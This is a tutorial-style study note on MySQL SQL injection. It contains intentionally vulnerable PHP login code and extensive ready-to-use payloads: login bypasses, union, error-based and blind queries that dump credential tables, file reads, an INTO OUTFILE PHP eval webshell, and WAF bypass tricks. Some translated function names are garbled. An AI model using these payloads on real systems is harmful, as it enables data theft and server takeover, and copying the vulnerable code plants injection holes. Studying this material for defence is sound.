# Database Safe Learning—Mysql

Author: H3rmesk1t

Data: 2022.03.12

# SQL Injection
## concept
The so-called `SQL` injection, simply put, means that the developer does not strictly restrict or escape the user's input data, causing the user to construct special `SQL` commands in places such as `Web` forms, where they can interact with the database, so as to achieve the purpose of spoofing the server, leaking database information, executing commands and even `getshell`.


The following is a sample code that simulates a `Web` application for login operation. If the login is successful, it will return `success`; otherwise it will return `fail`.

```php
<?php
    $conn = mysqli_connect($servername, $username, $password, $dbname);
    if (!$conn) {
        die("Connection failed: " . mysqli_connect_error());
    }
    $username = @$_POST['username'];
    $password = @$_POST['password'];
    $sql = "select * from users where username = '$username' and password='$password';";
    $rs = mysqli_query($conn, $sql);
    if($rs->fetch_row()){
        echo "success";
    }else{
        echo "fail";
    }
?>
```

When a user submits a form normally, the `SQL statement is: `select * from users where username = 'xxx' and password = 'xxx';`. Since the variables `$username` and `$password` are both user-controllable input content, when the `$username` entered by the user is `admin'#`, the `SQL statement for submitting the form is: `select * from users where username = 'admin'# and password = 'xxx';`. `#` is a single-line comment, and the following content can be commented out. Then the semantics of this statement will change. The user can do not need to judge the password, and only needs a user name to complete the login operation. This leads to the simplest `SQL` injection vulnerability.

## type
Classification by injection points can be divided into the following categories:
 - Digital injection
 - Character injection
 - Search type injection
 - Wide byte injection
 - Base64 Deformation Injection

Classification by submission can be divided into the following categories:
 - GET Injection
 - POST injection
 - Cookie Injection
 - Referer Injection
 - User Agent Injection
 - X-Forwarded-For Injection

According to the execution effect classification, it can be divided into the following categories:
 - Joint injection
 - Error injection
 - Boolean blind
 - Time blind
 - Stack Injection


# Introduction to MySQL
[MySQL](https://baike.baidu.com/item/MySQL/471251#:~:text=MySQL%E6%98%AF%E4%B8%80%E4%B8%AA%E5%85%B3%E7%B3%BB,%E4%BD%9C%E4%B8%BA%E7%BD%91%E7%AB%99%E6%95%B0%E6%8D%AE%E5%BA%93%E3%80%82) is a relational database management system, developed by Swedish `MySQL AB` company and belongs to the product of `Oracle`. `MySQL` is one of the most popular relational database management systems, in terms of `WEB` applications, `MySQL` is one of the best `RDBMS` (Relational Database Management System) application software.

`MySQL` is a relational database management system where relational databases store data in different tables instead of putting all data in a large warehouse, which increases speed and flexibility.

The `SQL` language used by `MySQL` is the most commonly used standardized language for accessing databases. `MySQL` software adopts a dual authorization policy, divided into community version and commercial version. Due to its small size, fast speed, and low overall cost of ownership, especially the characteristics of open source, generally small and medium-sized website development choose `MySQL` as the website database.

A complete MySQL management system structure is usually as shown in the figure below. You can see that MySQL can manage multiple databases, a database can contain multiple data tables, and a data table has multiple fields, and a row of data is a string of data with multiple fields in the same row.

<div align=center><img src="./images/1.png"></div>


# MySQL Injection
In the `MySQL` database, common operations for processing data include: four basic operations: addition, deletion, modification, and search. Each operation has a different role and together constitutes most of the operations on the data. At the same time, they also have the security risks of `SQL` injection. The complete format of a `MySQL` query statement is as follows:

```php
SELECT
    [ALL | DISTINCT | DISTINCTROW ]
      [HIGH_PRIORITY]
      [STRAIGHT_JOIN]
      [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT]
      [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS]
    select_expr [, select_expr ...]
    [FROM table_references
      [PARTITION partition_list]
    [WHERE where_condition]
    [GROUP BY {col_name | expr | position}
      [ASC | DESC], ... [WITH ROLLUP]]
    [HAVING where_condition]
    [ORDER BY {col_name | expr | position}
      [ASC | DESC], ...]
    [LIMIT {[offset,] row_count | row_count OFFSET offset}]
    [PROCEDURE procedure_name(argument_list)]
    [INTO OUTFILE 'file_name'
        [CHARACTER SET charset_name]
        export_options
      | INTO DUMPFILE 'file_name'
      | INTO var_name [, var_name]]
    [FOR UPDATE | LOCK IN SHARE MODE]]
```

## Common basic functions
In `MySQL`, functions commonly used to obtain basic information are:

```php
version() # View the current database version
@@version
@@global.vesion

user() # View the current logged-in user
system_user()
Current_user()
session_user()
Current_user

sechma() # The database currently used
database()

@@datadir # Data storage path
@@basedir # MySQL installation path
@@pid_file # pid-file file path
@@log_error # Error log file path
@@slave_load_tmpdir # Temporary folder path
@@character_sets_dir # Character set file path


@@version_compile_os # Operating system version
```

## Common string functions
In `MySQL`, functions commonly used to process strings are:

```php
mid() # Intercept string
substr()
length() # Return the length of the string
Substring()
left() # Get the string with the specified number of characters starting from the left
concat() # Connection string without separator
concat_ws() # Concatenation string containing splitter
group_concat() # concatenate a group string
ord() # Return ASCII code
ascii()
hex() # Convert string to hexadecimal
unhex() # hex reverse operation
md5() # Return MD5 value
round(x) # Return parameter x close to integer
floor(x) # Return not greater than x
The maximum integer
rand() # Returns a random floating point number between 0-1
load_file() # Read the file and return the file content as a string
sleep() # sleep time is the specified number of seconds
if(true, t, f) # if judgment
benchmark() # Specify the number of times the statement is executed
find_in_set() # Returns the position of the string in the string list
```

## Important database
```php
information_schema # MySQL system table
mysql.innodb_table_stats # tables carried by MySQL default storage engine innoDB
mysql.innodb_index_stats
sys.schema_auto_increment_columns # MySQL5.7 added
sys.schema_table_statistics_with_buffer
```

## Important Table

```php
schemata # database information
schema_name

tables # table information
table_schema
table_name

columns # field information
column_name
```

## Injection method
For example: `http://www.test.com/sql.php?id=1`.
### Universal password background login
````sql
admin' --
admin' #
admin'/*
or '=' or
' or 1=1--
' or 1=1#
' or 1=1/*
') or '1'='1--
') or ('1'='1--
```

### Determine whether there is injection
#### Numerical injection
 - sql.php?id=1+1
 - sql.php?id=-1 or 1=1
 - sql.php?id=-1 or 10-2=8
 - sql.php?id=1 and 1=2
 - sql.php?id=1 and 1=1

#### Character injection
 - sql.php?id=1'
 - sql.php?id=1"
 - sql.php?id=1' and '1'='1
 - sql.php?id=1" and "1"="1

### Joint query injection

````sql
# Determine how many columns are returned in a SQL statement
order by 3 --+

# View the display position
union select 1, 2, 3 --+

# Explode data
union select 1, version(), database() --+

# Breaking out a single database
union select 1, database(), schema_name from information_schema.schemata limit 0, 1 --+

# Explode all databases
union select 1, database(), group_concat(schema_name) from information_schema.schemata --+

# Explode a single table name in the database security
union select 1, database(), (select table_name from information_schema.tables where table_schema = database() limit 0, 1) --+

# Explode all table names in the database security
union select 1, database(), (select group_concat(table_name) from information_schema.tables where table_schema = database()) --+

# Explode a field from the table name users
union select 1, database(), (select column_name from information_schema.columns where table_schema = database() and table_name = 'users' limit 0, 1) --+

# Explode all fields from table name users
union select 1, database(), (select group_concat(column_name) from information_schema.columns where table_schema = database() and table_name = 'users' ) --+

# Explode a data from the corresponding column names in the users table
union select 1, database(), concat(id, 0x7e, username, 0x3A, password, 0x7e) from users limit 0,1 --+

# Explode all data from the corresponding column names in the users table
union select 1, database(), (select group_concat(concat(id, 0x7e, username, 0x3A, password, 0x7e)) from users) --+
```

### Report an error injection
Database error injection version restrictions:

|Error function|Database version (5.0.96, 5.1.60, 5.5.29, 5.7.26, 8.0.12)|
|:---:|:---:|
|extractvalue|5.1.60, 5.5.29, 5.7.26, 8.0.12|
|updatexml|5.1.60, 5.5.29, 5.7.26, 8.0.12|
|floor|5.0.96, 5.1.60, 5.5.29, 5.7.26|
|exp|5.5.29|
|geometrycollection|5.1.60, 5.5.29|
|linestring|5.1.60, 5.5.29|
|polygon|5.1.60, 5.5.29|
|multipoint|5.1.60, 5.5.29|
|multipolygon|5.1.60, 5.5.29|
|multilinestring|5.1.60, 5.5.29|

#### extractvalue
````sql
# Current database
and extractvalue(1,concat(0x7e,(select database()),0x7e)) --+

# When a database is exposed, you need to pay attention to the display length limitation. If it is too long, it will not be displayed.
and extractvalue(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e)) --+

# Explode a table name from the current database
and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)) --+

# Explode a field name from the users table in the current database
and extractvalue(1,concat(0x7e,( select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1 ),0x7e)) --+

# Explode a data from the corresponding column names in the users table
and extractvalue(1,concat(0x7e,( select concat(id,0x7e,username,0x7e,password) from users limit 0,1),0x7e)) --+
```

#### updatexml
````sql
# Current version
and updatexml(1,concat(0x7e,(select version()),0x7e),3) --+

# When a database is exposed, you need to pay attention to the display length limitation. If it is too long, it will not be displayed.
and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e),3) --+

# Explode a table name from the current database
and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),3) --+

# Explode a field name from the users table in the current database
and updatexml(1,concat(0x7e,( select column_name from information_schema.columns where table_sch
ema=database() and table_name='users' limit 0,1 ),0x7e),3) --+

# Explode a data from the corresponding column names in the users table
and updatexml(1,concat(0x7e,( select concat(id,0x7e,username,0x7e,password) from users limit 0,1),0x7e),3) --+
```

#### floor
````sql
# Current version
and(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) --+

# Breaking out a database
and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) --+

# Explode a table name from the current database
and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) --+

# Explode a field name from the users table in the current database
and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_schema='security' and table_name='users' LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) --+

# Explode a data from the corresponding column names in the users table
and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM users limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) --+
```

#### exp
````sql
and (select exp(~(select * from(select version())x)); --+
```

#### geometrycollection
````sql
and geometrycollection((select * from(select * from(select version())a)b)); --+
```

#### linestring
````sql
and linestring((select * from(select * from(select version())a)b)); --+
```

#### polygon
````sql
and polygon((select * from(select * from(select version())a)b)); --+
```

#### multipoint
````sql
and multipoint((select * from(select * from(select version())a)b)); --+
```

#### multipolygon
````sql
and multipolygon((select * from(select * from(select version())a)b)); --+
```

#### multilinestring
````sql
and multilinestring((select * from(select * from(select version())a)b)); --+
```

#### Non-existent functions
In `MySQL`, when selecting a function that does not exist, you may get the current database name.

<div align=center><img src="./images/2.png"></div>

### Boolean blind
The following statements can be judged by means of signs greater than or less than combined with dichotomies, thereby shortening the time spent on injection.
####Judge length
````sql
# determine the length of the current database
and length(database())=8 --+

# Determine how many tables are in the current database
and ((select count(*) from information_schema.tables where table_schema=database())=4) --+

# Judge the length of each table
and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6 --+
and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)=1--+

# Number of columns in the judgment table users
and ((select count(*) from information_schema.columns where table_schema=database() and table_name='users')=3) --+

# Determine the number of columns in a table
and ((select count(*) from information_schema.columns where table_schema=database() and table_name=(select table_name from information_schema.tables where table_schema=database() limit 3,1))=3) --+

# Determine the length of data of the corresponding fields in a table
and length((select username from users where id =1))=4 --+
and length((select password from users where id =1))=4 --+
```

#### Blasting content
````sql
# Guess the name of the current database
and ascii(substr((select database()),1))=115--+

# Guess the table name of a certain table
and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),5))=115 --+

# Guess a column name in a table
and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 1,1),8))=101 --+

# Guess the data named username in a table
and ascii(substr((select username from users limit 0,1),1)) = 68--+
```

### Time blind
Time blinds are mainly based on Boolean blinds and are judged using delayed functions. They can be mainly divided into the following types:
 - sleep
````sql
# When the expression is Ture, the page is stuck for 5 seconds, otherwise the page is stuck for one second.
and if(length(database())=8,sleep(5),1) --+
```
 -
benchmark
````sql
# When the expression is Ture, the page is stuck for 5 seconds, otherwise the page is stuck for one second.
and if(length(database())=8,benchmark(10000000,sha(1)),1) --+
```
 - Cartesian product
````sql
# If the delay is inaccurate, the time-consuming process will be high when the number of count() is large; if the number of count() is small, the time-consuming process will be low.
and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C); --+
```
 - get_lock
````sql
# The ctf table is locked, and the judgment will be made after 5 seconds (0=1), otherwise the judgment will be made without delay (1=1)
and get_lock('ctf',5)=1 --+
```
 - rlike
````sql
select rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');
```

### Stack Injection
Stacking injection is not common in `MySQL`, and it is necessary to use `mysqli_multi_query` or `PDO`. You can use semicolons to execute multiple statements, which is equivalent to directly connecting to the database. Since semicolons are the endorsements of `MySQL` statements, if multiple statements are supported, this method can be used to execute other malicious statements, such as `RENAME`, `DROP`, etc.

Note that when multiple statements are executed, if the previous statement has returned data, the data returned by the subsequent statements cannot be returned to the front-end page. Therefore, `union` joint injection can be used. If joint injection cannot be used, consider using the `RENAME` keyword to change the desired data column name/table name to the table/column name defined by the `SQL` statement that returns the data. Reference: [2019 Strong Net Cup - A casual note] (https://blog.csdn.net/qq_44657899/article/details/103239145).

Support for stack injection in PHP, refer to: [Exploration of SQL injection in PDO scenario] (https://xz.aliyun.com/t/3950).

||Mysqli|PDO|MySQL|
|:---:|:---:|:---:|:---:|
|Introduced PHP version|5.0|5.0|3.0|
|Does PHP5.x include |Yes |Yes |Yes |
|Multi-statement execution support situation|Yes|Most|No|

### Secondary injection
Secondary injection is the problem of the `SQL` injection caused by the attacker's malicious `payload` constructed by the attacker will first be stored in the database by the server, and then the database will be fetched out when splicing the `SQL` statement.

For example, the following `SQL` statement that querys the current login user information assumes that the problem caused by the `addslashes` function, single quote closure, and no encoding occurs.

````sql
select * from users where username = '$_SESSION['username']';
```

You can first register a username called `admin' #`. Because single quotes are escaped during registration, `insert` cannot be directly injected, and the registered username is stored in the server. Note: The backslash escapes single quotes, and the data obtained in `MySQL` does not have a backslash.

When logging in, use the registered `admin' #` to log in to the system and store some user data in the `SESSION`, such as `$_SESSION['username']`. Since `$_SESSION['username']` is not processed, it will be spliced ​​directly into the `SQL` statement, which will cause `SQL` injection, and the final statement is:

````sql
select * from users where username='admin' #'
```

### Wide byte injection
Let’s take a look at the corresponding sample code first, where the `addslashes` function will escape some characters of `username` and `password` received by `POST`:
 - The characters `'`, `"`, `\` will be preceded by a backslash`\` as escaped characters.
 - Multiple spaces are filtered into one space.

```php
<?php
    $conn = mysqli_connect("127.0.0.1:3307", "root", "root", "db");
    if (!$conn) {
        die("Connection failed: " . mysqli_connect_error());
    }
    $conn->query("set names 'gbk';");
    $username = addslashes(@$_POST['username']);
    $password = addslashes(@$_POST['password']);
    $sql = "select * from users where username = '$username' and password ='$password';";
    $rs = mysqli_query($conn,$sql);
    echo $sql.'<br>';
    if($rs->fetch_row()){
        echo "success";
    }else{
        echo "fail";
    }
?>
```

In the example code, there is a special statement `$conn->query("set names 'gbk';");`, which is equivalent to:

````sql
SET character_set_client = 'gbk';
SET character_set_results = 'gbk';
SET character_set_connection = 'gbk';
```

When the input data is `username=%df%27or%201=1%23&password=123`, after processing of the `addslashes` function, it finally becomes `username=%df%5c%27or%201=1%23&password=123`, after decoding `gbk`, we get `username=run'or 1=1#` and `password=123`, and the `SQL` statement is as follows, and the escape limit of `addslashes` is successfully broken:

````sql
select * from users where username = 'run'or 1=1#' and password='123';
```
The principle is as follows:
 - When the `SQL` statement communicates with the database, the corresponding encoding set by the `character_set_client` of the `SQL` statement will be first transcoded, that is, converted to `gbk` encoding. Since the encoding of `PHP` is `UTF-8`, when the input content is `%df%27`, it will be treated as two characters, and will be processed by the function `addslashes` to become `%df%5c%27`. After the `character_set_client` encoding process is processed by the client layer, it will become `run`, and the backslash is successfully removed, causing single quotes to escape. You can refer to [A Brief Analysis of Character Coding and SQL Injection in White Box Audit] (https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html).


### Uncolumn name injection
Column-less name injection is generally accompanied by `bypass information_schema`. When this table is filtered, you can only bypass `sys.schema_auto_increment_columns`, `sys.schema_table_statistics_with_buffer`, `mysql.innodb_table_stats`, etc., but these tables generally do not have field names, so you can only get table names. Therefore, after knowing that the statement, you need to further use column-less name injection.

#### Column name duplication (join...using)
Conditions of use: Requires an error report.

````sql
select * from (select * from users a join users b)c;
select * from (select * from users a join users b using(id))c;
select * from (select * from users a join users b using(id,username))c;
```

<div align=center><img src="./images/5.png"></div>

`join...using` principle: The `JOIN` clause is used to combine rows from two or more tables based on common fields between tables.

````sql
select * from users join catfishblog_users on users.id = catfishblog_users.id;
```

<div align=center><img src="./images/6.png"></div>

````sql
select * from users join catfishblog_users using(id);
```

<div align=center><img src="./images/7.png"></div>

````sql
select * from users,catfishblog_users where users.id
= catfishblog_users.id;
```

<div align=center><img src="./images/8.png"></div>

Let’s take a look at the situation where the `select` is installed outside. You can see that only `using` will not report an error, while the other two reported duplicate errors and pointed out the specific column names.

````sql
select * from (select * from users join catfishblog_users on users.id = catfishblog_users.id)a;
select * from (select * from users join catfishblog_users using(id))a;
select * from (select * from users,catfishblog_users where users.id = catfishblog_users.id)a;
```

<div align=center><img src="./images/9.png"></div>

Suppose you don't know any column names, delete the following `on`, `using`, and `where`. You can explode the first field at this time, but when you know the first field and want to explode the second field, the result will be different. This is because `users` and `catfishblog_users` have only one column name duplicate, so `join` has two same tables, and you also need to give two aliases to these two tables.

````sql
select * from (select * from users a join users b on a.id = b.id)a;
select * from (select * from users a join users b using(id))a;
select * from (select * from users a,users b where a.id = b.id)a;
```

<div align=center><img src="./images/10.png"></div>

##### Reference column names by alias &&(union)
Conditions of use: Query content echoes.

The database content is still the above. Assuming that you don’t know the field name of `users`, you can convert its column name into an alias: `select 1,2,3 union select * from users;`.

<div align=center><img src="./images/11.png"></div>

Then you can quote this known alias to obtain data. It should be noted that when `select number`, the number needs to be added backticks (the subsequent command is not added to the convenience of writing documents): `select 2 from (select 1,2,3 union select * from users)x;`.

<div align=center><img src="./images/12.png"></div>

Alias ​​can be used when the backtick is `ban`: `select a from (select 1,2 a,3 union select * from users)x;`.

<div align=center><img src="./images/13.png"></div>

Or use double quotes: `select a from (select 1,"a",3 union select * from users)x;`.

<div align=center><img src="./images/14.png"></div>

##### Comparison of blindness
In the two column-free name injection attacks mentioned above, errors or echoes are required, which is not very friendly to blinds, so the comparison of blinds comes into being. When you know the table name, you can first `select` to output the desired content, and then construct a content to compare it as a condition for judgment during blinds.

First construct `select 1,0,0;`, and then compare `select (select ((select x,0,0)>(select * from users limit 1)));`, when `x` is `1`, the query result is `false`, and when `2`, the query result is `true`, so you can know that the value of the first field is `1`, and so on, the letters are the same.

<div align=center><img src="./images/15.png"></div>

<div align=center><img src="./images/16.png"></div>

### Other Injections
It mainly includes several other injection methods mentioned above that are classified in the submission method, such as `User-Agent` header field injection, `Referer` header field injection, `Cookie` header field injection, `XFF` header field injection, etc.

### File Reading and Writing
Here, the relevant knowledge of file reading is placed in the injection method because its utilization method is also used to import and export files through `SQL` injection, so as to obtain file content or write content to the file, so it is a special injection method.

Query user read and write permissions:
````sql
select file_priv from mysql.user where user = 'username';
```

#### File Reading
Usually, `load_file()` or `load data infile` or `load data local infile` is used to read file. The principle of reading files is the same. Create a new table, read the file into a string and read the data in the table after inserting it into the table. Use prerequisites:
 - `secure_file_priv` is not `NULL`. You can use `select @@secure_file_priv` to view its value. When the value is not an empty string, you can only use this directory to read and write files.
 - The current database user has `FILE` permission, use `show grants` to view.
 - The system user `mysql` is readable to this file (the system's access control policy must be considered. When using `MySQL` in `Ubuntu-18.04`, the default system user is `mysql`).
 - The size of the read file is less than `max_allowed_packet`, and you can use `select @@max_allowed_packet` to view it.
 - You need to know the absolute physical path of the file.

The value of `secure_file_priv`:
 - When `secure_file_priv` is `NULL`, import and export are not allowed.
 - When `secure_file_priv` is specified, it means that the import and export of `MySQL` can only happen in the specified folder.
 - When `secure_file_priv` is not set, it means there is no limit.

`Payload` is as follows, and you need to pay attention to the processing of slashes in the path (when injecting the `WINDOWS` system):

````sql
UNION SELECT LOAD_FILE("C:/shell.php")
UNION SELECT LOAD_FILE("C://shell.php")
UNION SELECT LOAD_FILE("C:\\shell.php")
UNION SELECT LOAD_FILE(CHAR(67,58,92,92,115,104,101,108,108,46,112,104,112))
UNION SELECT LOAD_FILE(0x433a7368656c6c2e706870)
```

#### File writing
`INTO OUTFILE` is usually used to write files, and the prerequisites are used:
 - `secure_file_priv` is not `NULL`. You can use `select @@secure_file_priv` to view its value. When the value is not an empty string, you can only use this directory to read and write files.
 - The current database user has `FILE` permission, use `show grants` to view.
 - The system user `mysql` is readable to this file (the system's access control policy must be considered. When using `MySQL` in `Ubuntu-18.04`, the default system user is `mysql`).
 - The size of the read file is less than `max_allowed_packet`, and you can use `select @@max_allowed_packet` to view it.
 - You need to know the absolute physical path of the website, ensure that the exported `webshell` is accessible, and has writable permissions to the directory to be exported.

`Payload` is as follows, and you need to pay attention to the processing of slashes in the path (when injecting the `WINDOWS` system):
````sql
UNION SELECT "<?php eval($_POST['h3rmesk1t'])?>" INTO OUTFILE 'C:\\phpstudy\\WWW\\test\\webshell.php';
```

### Constraint attacks
Create a user table first:

````sql
CREATE TABLE users(
    username varchar(20),
    password varchar(20)
)
```

Registration code logic in the form:

```php
<?php
    $conn = mysqli_connect("127.0.0.1:3307", "root", "root", "db");
    if (!$conn) {
        die("Connection failed: " . mysqli_connect_error());
    }
    $username = addslashes(@$_POST['username'])
;
    $password = addslashes(@$_POST['password']);
    $sql = "select * from users where username = '$username'";
    $rs = mysqli_query($conn,$sql);
    if($rs->fetch_row()){
        die('Account registered');
    }else{
        $sql2 = "insert into users values('$username','$password')";
        mysqli_query($conn,$sql2);
        die('Registered successfully');
    }
?>
```

Login code logic in the form:

```php
<?php
    $conn = mysqli_connect("127.0.0.1:3307", "root", "root", "db");
    if (!$conn) {
        die("Connection failed: " . mysqli_connect_error());
    }
    $username = addslashes(@$_POST['username']);
    $password = addslashes(@$_POST['password']);
    $sql = "select * from users where username = '$username' and password = '$password';";
    $rs = mysqli_query($conn,$sql);
    if($rs->fetch_row()){
        $_SESSION['username'] = $password;
    }else{
        echo "fail";
    }
?>
```

There is no encoding problem in the above code and single quotes are processed, but there may still be `SQL` injection problem. In the statement creating the table above, the maximum length of `username` and `password` is limited to `20`. When the insertion data exceeds `20`, `MySQL` will intercept the previous `20` characters for insertion. For `SELECT` query request, if the query data exceeds `20` length, no intercept operation will be performed, which creates an attack point that constrains the attack.

For the code of the registry, it is necessary to determine whether the registered username exists, and then perform the data insertion operation. Suppose that an account with `username=admin[20 spaces]x&password=123456` is registered first. If it exists, it cannot register; if it does not exist, perform the data insertion operation. The maximum length of the `username` and `password` fields are limited here to be `20`, so the actual data inserted is `username=admin[15 spaces]&password=123456`. When logging in, use `username=admin&password=123456` to successfully log in to the `admin` account.





# MySQL Injection Trick
## Common defense methods bypass
With the increasing number of `SQL` injection methods, more and more defense methods are constantly emerging. Many times, the input content will often encounter various filtering interceptions. Filtering: Some of the input contents are deleted by the program before splicing the `SQL` statement, and then the filtered contents are spliced ​​into the `SQL` statement and continue to communicate with the database. Intercept: Detect the contents of the input part. If the specified content is detected, it will directly return to the intercept page, and the operation of splicing the `SQL` statements and communicating with the database will not be performed.

### Space
 1. Multi-layered bracket nesting. In `MySQL`, brackets are used to enclose subqueries, so any statement that can calculate the result can be enclosed with brackets.
 2. Replace space with `+`.
 3. Replace the comments with spaces, such as: `/**/`, `/*!*/`.
 4. The `and`/`or` can be followed by even numbers of `!` and `~` can replace spaces, or can be used in mixture (but the rules will be different). The spaces before `and`/`or` can be omitted.
 5. Invisible characters such as `%09`, `%0a`, `%0b`, `%0c`, `%0d`, `%a0` can also replace spaces.

````sql
select * from users where username='h3rmesk1t'union(select+ctf,flag/**/from/*!article*/where/**/id='1'and!!!~~1=1)
```

### Brackets
 1. The size of `order by` is relatively blind.

### Comma
 1. Blind.
 2. Use the `like` statement instead, for example: `select ascii(mid(user(),1,1))=80` is equivalent to `select user() like 'r%'`.
 3. Use the `join` statement instead, for example: `UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c);` is equivalent to `UNION SELECT 1,2,3;`.
 4. Use `from for` or `limit offset`, for example: `substr(data from 1 for 1)` is equivalent to `substr(data,1,1)`, and `limit 9 offset 4` is equivalent to `limt 9,4`.

### and/or
 1. Double write bypass, for example: `anandd`, `oorr`.
 2. Use operators instead, for example: `&&`, `||`.
 3. Directly splice the `=` number, for example: `?id=1=(condition)`.
 4. Other methods, such as: `?id=1^(condition)`.

### Single and double quotes
 1. The situation where single quotes need to be popped out: try whether there is a coding problem with `SQL` injection.
 2. There is no need to jump out of single quotes: strings can be represented in hexadecimal, or they can be represented in other binary formats through a binary conversion function, such as `char()`.

### System keywords
 1. Double write bypass keyword filtering.
 2. Case bypass, the `SQL` statement ignores whether the keyword is case-based, but the `WAF` basically intercepts are case-based.
 3. Use synonymous functions/statements instead, such as the `if` function can be replaced by the `case when condition then 1 else 0 end` statement.

### number
Use `conv([10-36],10,36)` to achieve the representation of all characters.

````sql
false, !pi() 0
true, !!pi() 1
true+true 2
floor(pi()) 3
ceil(pi()) 4
floor(version()) 5
ceil(version()) 6
ceil(pi()+pi()) 7
floor(version()+pi()) 8
floor(pi()*pi()) 9
ceil(pi()*pi()) 10 A
ceil(pi()*pi())+true 11 B
ceil(pi()+pi()+version()) 12 C
floor(pi()*pi()+pi()) 13 D
ceil(pi()*pi()+pi()) 14 E
ceil(pi()*pi()+version()) 15 F
floor(pi()*version()) 16 G
ceil(pi()*version()) 17 H
ceil(pi()*version())+true 18 I
floor((pi()+pi())*pi()) 19 J
ceil((pi()+pi())*pi()) 20 K
ceil(ceil(pi())*version()) 21 L
ceil(pi()*ceil(pi()+pi())) 22 M
ceil((pi()+ceil(pi()))*pi()) 23 N
ceil((pi()+ceil(pi()))*pi()) 23 N
ceil(pi())*ceil(version()) 24 O
floor(pi()*(version()+pi())) 25 P
floor(version()*version()) 26 Q
ceil(version()*version()) 27 R
ceil(pi()*pi()*pi()-pi()) 28 S
floor(pi()*pi()*floor(pi())) 29 T
```

## Problems caused by encoding conversion
In the above, we talked about the related utilization methods of wide byte injection, dealing with the encoding problems caused by `gbk`, and continuing to look at another classic encoding problem "the encoding problems caused by `latin1`
.

The sample code is as follows:

```php
<?php
// Excerpt from: Farewell Song's blog
    $mysqli = new mysqli("localhost", "root", "root", "cat");

    /* check connection */
    if ($mysqli->connect_errno) {
        printf("Connect failed: %s\n", $mysqli->connect_error);
        exit();
    }

    $mysqli->query("set names utf8");
    $username = addslashes($_GET['username']);

    if($username === 'admin'){
        die("You can't do this.");
    }

    /* Select queries return a resultet */
    $sql = "SELECT * FROM `table1` WHERE username='{$username}'";

    if ($result = $mysqli->query( $sql )) {
        printf("Select returned %d rows.\n", $result->num_rows);

        while ($row = $result->fetch_array(MYSQLI_ASSOC)) {
            var_dump($row);
        }

        /* free result set */
        $result->close();
    } else {
        var_dump($mysqli->error);
    }

    $mysqli->close();
?>
```

The table creation statement is as follows:

````sql
CREATE TABLE `table1` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(255) COLLATE latin1_general_ci NOT NULL,
  `password` varchar(255) COLLATE latin1_general_ci NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=1 DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci;
```

Set the table encoding to `latin1` in the table creation statement. In fact, the default encoding is also `latin1`. Add a data to the table: `insert table1 VALUES(1,'admin','admin');`.

In the example code, `if($username === 'admin'){die("You can't do this.");}` judges the user's input. If the input content is `admin`, the code output is directly returned, and the output content is also processed `addslashes`, so that single quotes cannot be escaped.

Notice that there is a code `$mysqli->query("set names utf8");` in the sample code, and the `SQL` statement will be executed after connecting to the database, which is equivalent to:

````sql
SET character_set_client = 'utf8';
SET character_set_results = 'utf8';
SET character_set_connection = 'utf8';
```

At this time, a problem will arise: the encoding of `PHP is `UTF-8`, and now the setting is also `UTF-8`. As mentioned above, the SQL statement will first be converted into the encoding set by `character_set_client`. After the conversion of the `character_set_client` client layer, the data will be handed over to the `character_set_connection` connection layer for processing. Finally, from `character_set_connection` to the internal operation character set of the data table. In this problem, the conversion of the character set is: `UTF-8—>UTF-8->Latin1`.

`UTF-8` encoding is variable-length encoding, which may have `1~4` bytes:
 - The range is [00-7F] in one byte.
 - The range when two bytes is [C0-DF][80-BF]
 - Three bytes range is [E0-EF][80-BF][80-BF]
 - The range when four bytes is [F0-F7][80-BF][80-BF][80-BF][80-BF]

